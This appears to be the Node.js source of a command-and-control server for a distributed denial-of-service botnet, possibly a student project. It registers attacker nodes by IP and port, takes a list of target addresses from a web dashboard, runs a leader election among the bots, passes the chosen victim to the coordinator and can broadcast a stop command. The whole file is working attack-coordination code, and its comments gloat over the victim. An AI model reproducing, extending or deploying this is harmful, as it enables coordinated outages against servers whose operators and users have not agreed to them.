// require necessary dependencies for http transactions
var express = require("express");
var app = express();
var request = require("request");
var http = require('http').Server(app);
var io = require("socket.io")(http);
var bodyParser = require('body-parser');

app.use(express.static(__dirname + '/www')); // path used for the webpage
app.use('/node_modules', express.static(__dirname + '/node_modules')); // path used to reference node modules in html

app.use(bodyParser.json()); // support json encoded bodies
app.use(bodyParser.urlencoded({ extended: true })); // support encoded bodies

var leader = ""; // leader id
var victim = ""; // victim ip address and port
var addresses2bAttacked = []; // array of servers to be attacked
var attackersData = {}; // JSON containing the data of the attackers, ip address and port

// Callback function when a HTTP PUT method is requested, in the path '/attacker'
// Converts attack received data to a format understood by the web client
// so it can be showed in the charts
app.put("/attacker", function(req, res) {
	console.log("Receiving attacker data...");
	console.log(req.body);
	
	// socket broadcast message to all the connected clients
	// with the received device data
	io.emit("device data", {
		"ID": req.body.id,
		"datetime": req.body.datetime,
		"data": req.body.data
	});

	// send all the attackers data as a response
	res.send(attackersData);
});

// Callback function when a HTTP POST method is requested, in the path '/attacker'
// Saves the new attacker's ip and port
app.post("/attacker", function(req, res) {
	var id = req.body.id;
	var ip = /.*:(([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3}))/g.exec(req.connection.remoteAddress)[1];
	var port = req.body.port;
	
	console.log("Attacker " + id + " connected");

	// save the attackers ip address and port
	updateAttackerIPAndPort(id, ip, port);
	//send all the attackers data as a response
	res.send(attackersData);
});

// Callback function when a HTTP POST method is requested, in the path '/coordinator'
// Server responds to the coordinator with a list of the potential victims of a DDoS attack
app.post("/coordinator", function(req, res) {
	if (leader === "") { // Only sends one message, avoid message overflow
		leader = req.body.leader;
		console.log("The leader is: " + leader);
		//Send array of victims
		console.log("sending array of potential victims...");
		console.log(addresses2bAttacked);
		res.send(addresses2bAttacked);
	} else {
		res.sendStatus(200);
	}
});

// Callback function when a HTTP POST method is requested, in the path '/victim'
// Saves the ip address and port of the victim
app.post("/victim", function(req, res) {
	victim = req.body.victim;
	console.log(victim + " is going to die!");
	console.log("God have mercy on it's soul...");
	res.sendStatus(200);
}) 

// Callback function when a 'connection' socket message is received
// A client connection is established
io.on('connection', function(socket){
  console.log('Web client connection established');

  	// Callback function when an 'attack' socket message is received
	// Receive the addresses coming from the Web Client
	socket.on('attack', function(data){
  		addresses2bAttacked = data.addresses;
  		startElection();
	});

	// Callback function when an 'stop' socket message is received
	// Stops the current attack
	socket.on('stop', function(data){
  		stopAttack();
	});
});

// Send an election HTTP POST message to all the attackers
// Starts the election algorithm and subsequent attack
function startElection() {
	leader = "";
	for (var key in attackersData) {
		request.post({
		  headers: {"content-type" : "text/plain"},
		  url:     "http://" + attackersData[key].ip + ":" + attackersData[key].port + "/election",
		  body:    ""
		}, function(error, res, body){
		  console.log(error);
		});
	}
}

// Send a victim HTTP DELETE message to all the attackers
// Stops the attack
function stopAttack() {
	for (var key in attackersData) {
		request.delete({
		  headers: {"content-type" : "text/plain"},
		  url:     "http://" + attackersData[key].ip + ":" + attackersData[key].port + "/victim",
		  body:    ""
		}, function(error, res, body){
		  console.log(error);
		});
	}
}

// Saves a given attacker ip address and port to attackersData JSON
function updateAttackerIPAndPort(id, ip, port) {
	if (!attackersData[id]) {
		attackersData[id] = {};
	}
	attackersData[id].ip = ip;
	attackersData[id].port = port;
}

//Starts the server, it listens on port 8080
var serverPort = 8080;
http.listen(serverPort);
console.log("Server running on: " + serverPort);